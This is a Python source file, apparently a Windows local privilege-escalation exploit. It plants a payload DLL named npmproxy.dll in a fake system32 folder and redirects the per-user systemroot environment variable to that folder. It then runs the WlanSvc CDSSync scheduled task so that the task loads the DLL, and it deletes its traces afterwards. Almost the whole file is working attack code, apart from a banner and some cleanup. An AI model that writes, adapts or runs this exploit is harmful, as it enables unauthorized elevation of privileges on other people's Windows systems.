def check_wlan_service():
    advapi32.OpenSCManagerW.argtypes = [wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.DWORD]
    advapi32.OpenSCManagerW.restype = wintypes.HANDLE
    advapi32.OpenServiceW.argtypes = [wintypes.HANDLE, wintypes.LPCWSTR, wintypes.DWORD]
    advapi32.OpenServiceW.restype = wintypes.HANDLE
    advapi32.QueryServiceStatus.argtypes = [wintypes.HANDLE, ctypes.POINTER(SERVICE_STATUS)]
    advapi32.QueryServiceStatus.restype = wintypes.BOOL
    advapi32.CloseServiceHandle.argtypes = [wintypes.HANDLE]
    advapi32.CloseServiceHandle.restype = wintypes.BOOL

    sc_handle = advapi32.OpenSCManagerW(None, None, SC_MANAGER_CONNECT)
    if not sc_handle:
        print(f"OpenSCManagerW() failed. Error: {kernel32.GetLastError()}")
        return False

    h_service = advapi32.OpenServiceW(sc_handle, "WlanSvc", SERVICE_QUERY_STATUS)
    advapi32.CloseServiceHandle(sc_handle)
    
    if not h_service:
        print(f"OpenServiceW() failed. Error: {kernel32.GetLastError()}")
        return False

    status = SERVICE_STATUS()
    if not advapi32.QueryServiceStatus(h_service, ctypes.byref(status)):
        advapi32.CloseServiceHandle(h_service)
        print(f"QueryServiceStatus() failed. Error: {kernel32.GetLastError()}")
        return False

    advapi32.CloseServiceHandle(h_service)
    
    if status.dwCurrentState == SERVICE_STOPPED:
        print("The WLAN AutoConfig service needs to be running.")
        return False
    
    return True

def main():
    h_console = kernel32.GetStdHandle(STD_OUTPUT_HANDLE)
    kernel32.SetConsoleTextAttribute(h_console, 8)
    banner = """
                    .___       ___.             ________________  ________ 
  _____ _____     __│ _╱____   ╲_ │__ ___.__.  ╱  _____╱╲_____  ╲╱   __   ╲
 ╱     ╲╲__  ╲   ╱ __ │╱ __ ╲   │ __ <   │  │ ╱   __  ╲   _(__  <╲____    ╱
│  Y Y  ╲╱ __ ╲_╱ ╱_╱ ╲  ___╱   │ ╲_╲ ╲___  │ ╲  │__╲  ╲ ╱       ╲  ╱    ╱ 
│__│_│  (____  ╱╲____ │╲___  >  │___  ╱ ____│  ╲_____  ╱╱______  ╱ ╱____╱  
      ╲╱     ╲╱      ╲╱    ╲╱       ╲╱╲╱             ╲╱        ╲╱          
"""
    print(banner)
    kernel32.SetConsoleTextAttribute(h_console, 7)

    if not check_wlan_service():
        sys.exit(1)

    try:
        os.makedirs("system32", exist_ok=True)
        dll_path = os.path.join("system32", "npmproxy.dll")
        with open(dll_path, "wb") as f:
            f.write(PAYLOAD_DLL_BYTES)
    except Exception as e:
        print(f"Erreur lors de la création du fichier/dossier : {e}")
        sys.exit(1)

    try:

        from win32com.client import gencache
        scheduler = gencache.EnsureDispatch("Schedule.Service")
        scheduler.Connect()
    except Exception as e:
        print(f"Échec de l'initialisation du Planificateur de tâches : {e}")
        if os.path.exists(dll_path): os.remove(dll_path)
        if os.path.exists("system32"): os.rmdir("system32")
        sys.exit(1)

    try:
        wdi_folder = scheduler.GetFolder("\\Microsoft\\Windows\\WDI")
        wdi_task = wdi_folder.GetTask("ResolutionHost")
        if wdi_task.State == 3:
            wdi_task.Stop(0)
    except Exception as e:
        print(f"Impossible de vérifier/stopper ResolutionHost (facultatif) : {e}")

    try:
        wlan_folder = scheduler.GetFolder("\\Microsoft\\Windows\\WlanSvc")
        diag_task = wlan_folder.GetTask("CDSSync")
    except Exception as e:
        print(f"Impossible de récupérer la tâche CDSSync : {e}")
        if os.path.exists(dll_path): os.remove(dll_path)
        if os.path.exists("system32"): os.rmdir("system32")
        sys.exit(1)

    current_dir = os.getcwd()
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Environment", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "systemroot", 0, winreg.REG_SZ, current_dir)
        winreg.CloseKey(key)
    except Exception as e:
        print(f"RegSetKeyValueW() failed : {e}")
        if os.path.exists(dll_path): os.remove(dll_path)
        if os.path.exists("system32"): os.rmdir("system32")
        sys.exit(1)

    task_result = 0x80004005
    try:
        running_task = diag_task.Run(None)

        time.sleep(0.5)
        task_result = diag_task.LastTaskResult
    except Exception as e:
        print(f"IRegisteredTask::Run() failed : {e}")
    finally:
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Environment", 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "systemroot")
            winreg.CloseKey(key)
        except WindowsError:
            pass

        try:
            if os.path.exists(dll_path): os.remove(dll_path)
            if os.path.exists("system32"): os.rmdir("system32")
        except OSError as e:
            print(f"Erreur lors du nettoyage des fichiers : {e}")

    if task_result != 0:
        print(f"The task process failed. Exit code (HRESULT): {hex(task_result)}")
        sys.exit(1)

    kernel32.SetConsoleTextAttribute(h_console, 2)
    print(">>> ", end="")
    kernel32.SetConsoleTextAttribute(h_console, 12)
    print("[!] ", end="")
    kernel32.SetConsoleTextAttribute(h_console, 2)
    print("Successful.\n")
    kernel32.SetConsoleTextAttribute(h_console, 7)

if __name__ == "__main__":
    main()